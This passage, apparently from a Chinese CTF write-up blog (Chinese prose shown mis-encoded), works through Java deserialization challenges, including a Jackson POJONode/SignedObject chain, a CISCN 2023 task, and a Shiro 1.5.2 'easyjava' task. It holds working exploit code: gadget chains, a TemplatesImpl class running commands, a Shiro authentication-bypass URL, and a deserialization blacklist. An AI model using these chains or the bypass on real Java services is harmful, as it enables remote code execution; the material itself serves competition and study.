class="hljs-comment">//æ³¨æ„è¿™é‡Œè¯»æ–‡ä»¶çš„URL,ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™ï¼šurl:file:///flag.txt</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        urlHelper.visiter = urlVisiter;<br><br>        <span class="hljs-comment">//ç”¨äºäºŒæ¬¡ååºåˆ—åŒ–çš„ç±»</span><br>        KeyPairGenerator keyPairGenerator;<br>        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-comment">//åˆ é™¤ pojoNode çš„ writeReplace</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> aaa.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException, pojoNode);<br>        <span class="hljs-comment">//è¿™é‡Œè®¾ç½®badAttributeValueExpExceptionå¯¹è±¡çš„valå€¼ä¸ºpojoNodeã€‚ååºåˆ—åŒ–badAttributeValueExpExceptionå°±ä¼šèµ°åˆ°pojoNode.ToString</span><br><br>        <span class="hljs-comment">//åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-åˆèµ›-DeserBug-æœªå®Œæˆ"><a href="#CISCN-2023-åˆèµ›-DeserBug-æœªå®Œæˆ" class="headerlink" title="[CISCN 2023 åˆèµ›]DeserBug(æœªå®Œæˆ)"></a>[CISCN 2023 åˆèµ›]DeserBug(æœªå®Œæˆ)</h2><p>æè¿°ï¼š<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p><p><code>Testapp.java</code>ä¸‹å­˜åœ¨ååºåˆ—åŒ–ï¼š</p><p><img src="E:/viper3/myblog/source/_posts/img/deserbug1.png" alt="deserbug1"></p><p>çœ‹ä¸‹<code>pom.xml</code></p><p><img src="E:/viper3/myblog/source/_posts/img/deserbug2.png" alt="deserbug2"></p><p>CC3.2.2ç‰ˆæœ¬ï¼ŒCCè‡ª3.2.1åæ–°æ·»åŠ äº†checkUnsafeSerializationåŠŸèƒ½å¯¹ååºåˆ—åŒ–å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œè€ŒCCé“¾å¸¸ç”¨åˆ°çš„InvokerTransformerå°±åˆ—å…¥äº†é»‘åå•ä¸­ï¼Œçœ‹ä¸‹ç»™çš„å¦ä¸€ä¸ª<code>Myexpect.java</code></p><p><img src="E:/viper3/myblog/source/_posts/img/deserbug3.png" alt="deserbug3"></p><p>ç»“åˆé¢˜ç›®æç¤ºèƒ½çŸ¥é“åˆ©ç”¨ç‚¹åœ¨è¿™ä¸ª<code>getAnyexpect</code>æ–¹æ³•ï¼Œå®ƒä¼š<code>new</code>ä¸€ä¸ªå®ä¾‹å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥æƒ³åˆ°ä¹‹å‰CC3é‚£éƒ¨åˆ†:åˆ©ç”¨åŠ¨æ€ç±»åŠ è½½æœºåˆ¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œç±»ä¼¼è¿™ç§ï¼š</p><p>çœ‹ä¸‹æç¤ºä¸­ç»™çš„<code>cn.hutool.json.JSONObject.put</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Deprecated</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">put</span><span class="hljs-params">(String key, Object value)</span> <span class="hljs-keyword">throws</span> JSONException &#123;<br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.set(key, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè·Ÿä¸‹è°ƒç”¨æ ˆï¼Œå³<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>ï¼Œæœ¬åœ°è°ƒè¯•ä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TmpTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br><br>        myexpect.setTargetclass(Evil.class);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br><br>        jsonObject.put(<span class="hljs-string">&quot;whatever&quot;</span>, myexpect);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2022-easyjava"><a href="#2022-easyjava" class="headerlink" title="[2022]easyjava"></a>[2022]easyjava</h2><p><a href="https://xz.aliyun.com/t/13279">å‚è€ƒæ–‡ç« </a></p><p><code>application.properties</code>:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">server.port</span>=<span class="hljs-number">8090</span><br><span class="hljs-attr">server.servlet.context-path</span>=/web<br><span class="hljs-attr">spring.thymeleaf.cache</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">spring.thymeleaf.mode</span>=HTML5<br></code></pre></td></tr></table></figure><p>åº”ç”¨ç¨‹åºå°†åœ¨ <code>/web</code> ä¸Šä¸‹æ–‡è·¯å¾„ä¸‹è¿è¡Œã€‚ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºçš„åŸŸåæ˜¯ <code>example.com</code>ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºå°†å¯ä»¥é€šè¿‡ <code>http://example.com/web</code> è®¿é—®</p><p>Shiroç‰ˆæœ¬1.5.2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Shiroæ¡†æ¶--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>ShiroConfig.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroConfig</span> &#123;<br>   <span class="hljs-meta">@Bean</span><br>   <span class="hljs-keyword">public</span> ShiroFilterFactoryBean <span class="hljs-title function_">getShiroFilterFactoryBean</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;getDefaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;<br>      <span class="hljs-type">ShiroFilterFactoryBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroFilterFactoryBean</span>();<br>      bean.setSecurityManager(defaultWebSecurityManager);<br>      Map&lt;String, String&gt; filterMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();<br>      filterMap.put(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;anon&quot;</span>);<br>      filterMap.put(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-string">&quot;anon&quot;</span>);<br>      filterMap.put(<span class="hljs-string">&quot;/admin/*&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>      bean.setFilterChainDefinitionMap(filterMap);<br>      bean.setLoginUrl(<span class="hljs-string">&quot;/login&quot;</span>);<br>      <span class="hljs-keyword">return</span> bean;<br>   &#125;<br><br>   <span class="hljs-meta">@Bean</span><br>   <span class="hljs-keyword">public</span> DefaultWebSecurityManager <span class="hljs-title function_">getDefaultWebSecurityManager</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;adminRealm&quot;)</span> AdminRealm adminRealm)</span> &#123;<br>      <span class="hljs-type">DefaultWebSecurityManager</span> <span class="hljs-variable">securityManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultWebSecurityManager</span>();<br>      securityManager.setRealm(adminRealm);<br>      <span class="hljs-keyword">return</span> securityManager;<br>   &#125;<br><br>   <span class="hljs-meta">@Bean</span><br>   <span class="hljs-keyword">public</span> AdminRealm <span class="hljs-title function_">adminRealm</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminRealm</span>();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>anonï¼šè¡¨ç¤ºå…è®¸åŒ¿åè®¿é—®ï¼Œå³ä¸éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯å°±å¯ä»¥è®¿é—®å¯¹åº”çš„URL<br>authcï¼šè¡¨ç¤ºéœ€è¦è¿›è¡Œèº«ä»½éªŒè¯åæ‰èƒ½è®¿é—®ï¼Œå³ç”¨æˆ·å¿…é¡»ç™»å½•åæ‰èƒ½è®¿é—®å¯¹åº”çš„URL</p></blockquote><p><code>HelloController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butler.springboot14shiro.MyController;<br><br><span class="hljs-keyword">import</span> com.butler.springboot14shiro.Util.MyObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.SecurityUtils;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.UnknownAccountException;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;<br><span class="hljs-keyword">import</span> org.apache.shiro.subject.Subject;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>      model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Hello World&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/login&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password, Model model)</span> &#123;<br>      <span class="hljs-type">Subject</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();<br>      <span class="hljs-type">UsernamePasswordToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernamePasswordToken</span>(username, password);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>         subject.login(token);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin/hello&quot;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (UnknownAccountException var7) &#123;<br>         model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;ç”¨æˆ·åé”™è¯¯&quot;</span>);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (IncorrectCredentialsException var8) &#123;<br>         model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;å¯†ç é”™è¯¯&quot;</span>);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/admin/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">admin</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(name = &quot;data&quot;,required = false)</span> String data, Model model)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(data);<br>         <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode);<br>         <span class="hljs-type">MyObjectInputStream</span> <span class="hljs-variable">myObjectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(inputStream);<br>         myObjectInputStream.readObject();<br>      &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>         var6.printStackTrace();<br>         model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;data=&quot;</span>);<br>      &#125;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin/hello&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆ<code>admin/hello</code>è·¯ç”±ä¸‹å¯ä»¥å°†<code>data</code>è§£ç åååºåˆ—åŒ–ï¼Œä½†é—®é¢˜æ˜¯å¾—ç»•è¿‡è¿™ä¸ª<code>Shiro</code>è®¤è¯æ‰è¡Œã€‚</p><p><a href="https://www.cnblogs.com/nice0e3/p/16248252.html">Shiroç»•è¿‡</a></p><p><img src="/img/Sshirobypass.png" alt="Sshirobypass"></p><p><a href="https://xz.aliyun.com/t/7964">åˆ†æ1</a></p><p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">åˆ†æ2</a></p><p>æ„é€ <code>http://node4.anna.nssctf.cn:28969/;/web/admin/hello?data=</code>å³å¯ç»•è¿‡<code>shiro</code>çš„èº«ä»½éªŒè¯</p><p>ç„¶å<code>MyObjectInputSteam</code>é‡Œbanäº†è¿™äº›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">blackList.add(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl&quot;</span>);<br>blackList.add(<span class="hljs-string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);<br>blackList.add(<span class="hljs-string">&quot;java.security.SignedObject&quot;</span>);<br>blackList.add(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br></code></pre></td></tr></table></figure><p>é˜»æ­¢äº†ä½¿ç”¨<code>Hibernate</code>ååºåˆ—åŒ–é“¾å’Œ<code>Jdbc</code>é“¾å­ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯Shiroï¼Œå†…ç½®çš„<code>BeanComparator</code>å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥æ‰“<code>CB</code>é“¾å­ï¼Œæ³¨æ„è¿™é‡Œæ˜¯<code>commons-beanutils1.9.4</code>ï¼Œåšpocçš„æ—¶å€™ä¹Ÿè¦æ¢æˆç›¸åŒçš„ç‰ˆæœ¬ï¼Œå¦åˆ™æ˜¯æŠ¥<code>serializeUID</code>é”™è¯¯ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åé¢å°±æ˜¯<code>CB</code>é‚£æ¡åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é“¾å­äº†ï¼Œæ¯”å¦‚å¼¹è®¡ç®—å™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Clac</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢execé‡Œçš„commandç”¨è¿™ä¸ªå†™(æˆ‘å†™calcæ–¹ä¾¿æœ¬åœ°æµ‹è¯•)ï¼š</p><p>[javaåå¼¹shell](<a href="https://ares-x.com/tools/runtime-exec/">Runtime.exec Payload Generater | AresXâ€™s Blog</a>)</p><p>EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butler.springboot14shiro.exp;<br> <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br> <br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        BeanComparator beanComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span 